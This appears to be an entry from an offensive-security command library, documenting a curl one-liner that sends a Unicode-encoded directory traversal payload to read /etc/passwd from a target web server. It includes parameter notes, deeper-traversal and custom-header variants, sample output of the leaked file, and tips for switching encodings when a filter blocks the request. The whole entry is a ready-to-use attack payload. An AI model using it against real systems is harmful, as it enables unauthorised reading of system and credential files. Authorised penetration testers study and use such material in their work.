---
id: 6d115d1a-0c00-4519-9e42-765dc868286a
name: curl-unicode-directory-traversal
type: command
executor: bash
data: 'curl -X GET "http://$_TARGET_URL?file=%u002e%u002e%u2215etc%u2215passwd" -v'
output: null
created_at: '2023-04-06T03:56:36.110238+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - web-exploitation
  - directory-traversal
verified: true
validated: true
---

# curl-unicode-directory-traversal

## Command

```bash
curl -X GET "http://$_TARGET_URL?file=%u002e%u002e%u2215etc%u2215passwd" -v
```

## Description

This command uses curl to send an HTTP GET request to a vulnerable web endpoint, injecting a Unicode-encoded directory traversal payload to access files outside the web root, such as /etc/passwd on Linux targets. Use it after identifying a file path parameter to test for traversal bypasses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint (e.g., http://example.com/page) | Yes |
| %u002e%u002e%u2215etc%u2215passwd | Encoded traversal payload; adjust depth and target file as needed (e.g., add more %u002e%u002e%u2215 for deeper traversal) | Yes |
| -X GET | Specifies the HTTP method (change to POST if required) | No |
| -v | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/vuln?file=%u002e%u002e%u2215etc%u2215passwd" -v
```

### Advanced Usage (with Custom Headers and Deeper Traversal)

```bash
curl -X GET "http://target.com/vuln?file=%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

A successful response (HTTP 200) will display the contents of the targeted file, e.g.:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

If blocked, expect 403/404 or filtered output; iterate on encodings like %u002f for '/' if %u2215 fails.

## Related

- [[procedures/Perform-Unicode-Directory-Traversal]]
